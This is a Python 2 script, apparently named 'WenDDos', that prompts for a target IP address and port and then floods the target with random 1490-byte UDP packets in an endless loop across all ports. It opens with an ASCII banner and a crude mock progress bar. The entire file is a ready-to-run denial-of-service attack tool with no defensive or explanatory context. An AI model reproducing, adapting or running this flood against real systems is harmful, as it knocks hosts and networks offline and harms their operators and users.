import sys
import os
import time
import socket
import string
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("""\033[1;31m  \033[92m
'##::::'##:'########:::::::::::'########:::::'###::::::::::'##:'####:
 ###::'###: ##.... ##:::::::::: ##.... ##:::'## ##::::::::: ##:. ##::
 ####'####: ##:::: ##:::::::::: ##:::: ##::'##:. ##:::::::: ##:: ##::
 ## ### ##: ########::::::::::: ########::'##:::. ##::::::: ##:: ##::
 ##. #: ##: ##.. ##:::::::::::: ##.... ##: #########:'##::: ##:: ##::
 ##:.:: ##: ##::. ##::::::::::: ##:::: ##: ##.... ##: ##::: ##:: ##::
 ##:::: ##: ##:::. ##:'#######: ########:: ##:::: ##:. ######::'####:
..:::::..::..:::::..::.......::........:::..:::::..:::......:::....::
""")
print(" ")
ip = raw_input("\033[94m[*] \033[91mIP \033[91mTarget \033[97m>>> \033[93m ")
port = input("\033[94m[*] \033[91mPORT \033[97m>>> \033[93m ")

os.system("clear")
print(" WenDDos Ready to Attack.. OK!! ")
print(" 8======D     15% ")
time.sleep(5)
print(" 8=============D      25% ")
time.sleep(5)
print(" 8====================D       50% ")
time.sleep(5)
print(" 8=============================D        75% ")
time.sleep(5)
print(" 8=====================================D     100% ")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
